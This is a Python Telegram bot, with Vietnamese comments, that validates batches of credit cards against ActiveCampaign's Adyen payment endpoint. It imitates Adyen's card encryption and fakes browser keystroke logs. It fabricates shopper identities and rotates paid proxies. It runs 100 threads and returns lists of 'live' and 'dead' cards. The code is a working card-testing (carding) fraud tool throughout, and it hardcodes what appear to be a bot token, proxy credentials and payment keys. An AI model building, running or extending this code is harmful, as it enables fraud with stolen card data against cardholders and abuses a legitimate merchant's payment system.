import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import uuid
import asyncio
import threading
import psutil
import io
from datetime import datetime

# Thư viện Telegram Bot
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# Thư viện mã hóa
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện Request
import pycurl

# ===================================================================
# === CẤU HÌNH BOT
# ===================================================================
BOT_TOKEN = "8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I"  # <--- THAY TOKEN CỦA BẠN VÀO ĐÂY
ALLOWED_USERS = [7787551672] # Điền ID Telegram của bạn vào đây nếu muốn bảo mật (VD: [123456789])

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION & LOGIC CỐT LÕI (GIỮ NGUYÊN)
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

# ===================================================================
# === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    log_entries = []
    current_time = random.randint(2000, 5000)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180)
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e: return bytearray(0)
    if len(e) % 2 == 1: e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t): r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32
def mt(e, t, r):
    if not (0 <= t < bt): raise ValueError(f"value error")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)
        self.key_object = {"kty": "RSA", "kid": "asf-key", "e": encoded_part1, "n": encoded_part2, "alg": "RSA-OAEP"}
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not stripe_key: stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain: domain = "https://www.mytheresa.com"
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    card_number = format_card_number(card)
    fake_number_log = generate_fake_log(16)
    fake_cvc_log = generate_fake_log(3)
    card_detail = {
        "encryptedCardNumber": {"number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", "activate": "3", "referrer": referrer, "numberFieldFocusCount": "1", "numberFieldLog": fake_number_log, "numberFieldClickCount": "1", "numberFieldKeyCount": "16"},
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {"cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": "4", "referrer": referrer, "cvcFieldFocusCount": "1", "cvcFieldLog": fake_cvc_log, "cvcFieldClickCount": "1", "cvcFieldKeyCount": "3", "cvcFieldChangeCount": "1", "cvcFieldBlurCount": "1", "deactivate": "2"}
    }
    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

def generate_browser_profile():
    chrome_version = random.randint(120, 131)
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36"
    return {
        "user_agent": user_agent,
        "sec_ch_ua": f'"Not_A Brand";v="8", "Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}"',
        "platform": '"Windows"'
    }

def generate_checkout_attempt_id():
    uuid_part = str(uuid.uuid4())
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
    return f"{uuid_part}{suffix}"

# ===================================================================
# === PHẦN 3: HÀM XỬ LÝ CHÍNH (LOGIC CŨ, TRẢ VỀ KẾT QUẢ)
# ===================================================================

def process_card_core(line_card):
    """
    Hàm này chứa toàn bộ logic request.
    Thay vì print, nó trả về tuple: (result_string, status, time_taken)
    status: 'LIVE', 'DIE', 'ERROR'
    """
    start_time = time.time()
    
    # Validation
    line_card = line_card.strip()
    normalized = normalize_card(line_card)
    if not normalized:
        return f"{line_card}|FORMAT_ERROR", "ERROR", 0
    
    cc, mm, yyyy, cvc = normalized.split('|')
    if not validate_luhn(cc):
        return f"{cc}|{mm}|{yyyy}|{cvc}|LUHN_FAIL", "ERROR", 0

    # Config (Giữ nguyên)
    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
    TARGET_DOMAIN = "https://www.activecampaign.com"

    data = {}
    response_text = ""
    max_retries = 20
    current_try = 0
    success_request = False

    while current_try < max_retries:
        try:
            encrypted_result = encrypt_card_data_480(
                card=cc, month=mm, year=yyyy, cvc=cvc, 
                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
            )

            profile = generate_browser_profile()
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            city = 'New York' 
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
            attempt_id = generate_checkout_attempt_id()

            headers_list = [
                'accept: application/json, text/plain, */*',
                'accept-language: en-US,en;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                f'user-agent: {profile["user_agent"]}',
                f'sec-ch-ua: {profile["sec_ch_ua"]}',
                'sec-ch-ua-mobile: ?0',
                f'sec-ch-ua-platform: {profile["platform"]}',
                'origin: https://www.activecampaign.com',
                'pragma: no-cache',
                'referer: https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-origin',
            ]

            json_data = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': attempt_id,
                },
                'shopperEmail': email,
                'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            post_body = json.dumps(json_data).encode('utf-8')

            buffer = io.BytesIO()
            c = pycurl.Curl()
            c.setopt(pycurl.URL, 'https://www.activecampaign.com/api/billing/adyen/payments')
            c.setopt(pycurl.POST, 1)
            c.setopt(pycurl.POSTFIELDS, post_body)
            c.setopt(pycurl.HTTPHEADER, headers_list)
            
            # Proxy
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            proxy_url = "http://aus.360s5.com:3600"
            base_auth = "88634867-zone-custom"
            pass_auth = "AetOKcLB"
            proxy_auth = f"{base_auth}-session-{session_id}:{pass_auth}"
            
            c.setopt(pycurl.PROXY, proxy_url)
            c.setopt(pycurl.PROXYUSERPWD, proxy_auth)
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.TIMEOUT, 30)
            c.setopt(pycurl.WRITEDATA, buffer)

            c.perform()
            c.close()

            response_text = buffer.getvalue().decode('utf-8')

            try:
                data = json.loads(response_text)
                success_request = True
                break
            except json.JSONDecodeError:
                pass

        except Exception:
            pass
        
        current_try += 1
        time.sleep(1)

    time_taken = round(time.time() - start_time, 2)

    if not success_request:
        return f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|NETWORK_FAIL|MAX_RETRIES|TimeTaken:{time_taken}s", "ERROR", time_taken

    additionalData = data.get('additionalData', {})
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')

    status = "DIE"
    msg_short = ""

    if resultCode == "Authorised" or resultCode == "Cancelled":
        status = "LIVE"
        msg_short = "APPROVED ✅"
    elif resultCode == "Refused":
        status = "DIE"
        msg_short = f"DIE - {refusalReason}"
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        status = "DIE" # Coi như die hoặc cần xử lý riêng
        msg_short = "3DS - 3D Secure required"
    else:
        status = "DIE"
        msg_short = f"UNK - {message if message != 'N/A' else resultCode}"

    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg_short}|TimeTaken:{time_taken}s"
    
    return result_string, status, time_taken

# ===================================================================
# === PHẦN 4: BOT LOGIC & HANDLERS
# ===================================================================

# Global Stats Storage (Simple)
# Key: ChatID
current_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
🤖 **ADYEN CHECKER BOT** 🤖

✅ **Tính năng:**
- Check file .txt với 100 luồng.
- Báo cáo Realtime (Live/Die/Error/CPM/CPU/RAM).
- Trả file kết quả Live/Die.
- Lệnh /st <cc> để check nhanh.

🚀 **Cách dùng:**
1. Gửi file `.txt` chứa thẻ (định dạng cc|mm|yy|cvv) để bắt đầu scan.
2. Dùng `/st 440066|...` để check lẻ.
    """
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler cho lệnh /st"""
    msg = update.message.text
    try:
        card_data = msg.split(' ', 1)[1]
    except IndexError:
        await update.message.reply_text("⚠️ Vui lòng nhập thẻ. Ví dụ: `/st 4455...`")
        return

    status_msg = await update.message.reply_text("⏳ Đang kiểm tra...")
    
    # Chạy logic trong thread khác để không block bot
    loop = asyncio.get_running_loop()
    result_str, status, time_taken = await loop.run_in_executor(None, process_card_core, card_data)
    
    await status_msg.edit_text(f"📝 **Kết quả:**\n`{result_str}`", parse_mode='Markdown')

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý file txt được gửi lên"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        return

    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Chỉ chấp nhận file .txt")
        return

    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    decoded_content = file_content.decode('utf-8', errors='ignore')
    
    cards = [line.strip() for line in decoded_content.splitlines() if line.strip()]
    total_cards = len(cards)
    
    if total_cards == 0:
        await update.message.reply_text("❌ File trống.")
        return

    status_msg = await update.message.reply_text(f"🚀 **Đang khởi động 100 luồng check {total_cards} thẻ...**", parse_mode='Markdown')
    
    # Khởi tạo Stats
    chat_id = update.effective_chat.id
    current_tasks[chat_id] = {
        'total': total_cards,
        'checked': 0,
        'live': 0,
        'die': 0,
        'error': 0,
        'start_time': time.time(),
        'results_live': [],
        'results_die': [],
        'is_running': True
    }

    # Chạy worker trong background
    asyncio.create_task(run_checker_task(chat_id, cards, status_msg, context))

async def run_checker_task(chat_id, cards, message_obj, context):
    stats = current_tasks[chat_id]
    
    # Update Status Message Loop
    async def update_message_loop():
        while stats['is_running'] and stats['checked'] < stats['total']:
            await asyncio.sleep(1.5) # Cập nhật mỗi 1.5s để tránh flood
            
            elapsed = time.time() - stats['start_time']
            if elapsed == 0: elapsed = 1
            cpm = int((stats['checked'] / elapsed) * 60)
            
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            
            text = f"""
📊 **PROCESS STATUS**
━━━━━━━━━━━━━━━━━━
💳 Total: {stats['total']}
✅ Live: {stats['live']}
❌ Die: {stats['die']}
⚠️ Error: {stats['error']}
🔄 Checked: {stats['checked']}
━━━━━━━━━━━━━━━━━━
⚡ CPM: {cpm}
🖥 CPU: {cpu}% | RAM: {ram}%
⏳ Time: {int(elapsed)}s
            """
            try:
                await message_obj.edit_text(text)
            except Exception:
                pass # Bỏ qua lỗi nếu message không edit được (do mạng lag)

    # Start monitor task
    monitor_task = asyncio.create_task(update_message_loop())

    # Worker function wrapper
    def thread_worker(card):
        res_str, status, _ = process_card_core(card)
        stats['checked'] += 1
        if status == 'LIVE':
            stats['live'] += 1
            stats['results_live'].append(res_str)
        elif status == 'DIE':
            stats['die'] += 1
            stats['results_die'].append(res_str)
        else:
            stats['error'] += 1
    
    # Sử dụng ThreadPoolExecutor để chạy 100 luồng
    loop = asyncio.get_running_loop()
    from concurrent.futures import ThreadPoolExecutor
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        # Submit tất cả task
        futures = [loop.run_in_executor(executor, thread_worker, card) for card in cards]
        # Chờ tất cả xong
        await asyncio.gather(*futures)
    
    stats['is_running'] = False
    await monitor_task # Đảm bảo vòng lặp update dừng lại

    # Tổng kết
    elapsed = time.time() - stats['start_time']
    final_text = f"""
✅ **COMPLETED**
━━━━━━━━━━━━━━━━━━
💳 Total: {stats['total']}
✅ Live: {stats['live']}
❌ Die: {stats['die']}
⏱ Time: {int(elapsed)}s
    """
    try:
        await message_obj.edit_text(final_text)
    except:
        await context.bot.send_message(chat_id, final_text)

    # Gửi file kết quả
    if stats['results_live']:
        live_content = "\n".join(stats['results_live'])
        await context.bot.send_document(chat_id, InputFile(io.BytesIO(live_content.encode('utf-8')), filename="Live_Cards.txt"), caption="✅ Live Cards")
    
    if stats['results_die']:
        die_content = "\n".join(stats['results_die'])
        await context.bot.send_document(chat_id, InputFile(io.BytesIO(die_content.encode('utf-8')), filename="Die_Cards.txt"), caption="❌ Die Cards")

    # Clean up memory
    del current_tasks[chat_id]

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("st", single_check))
    app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), file_handler))
    
    print("Bot is running...")
    app.run_polling()
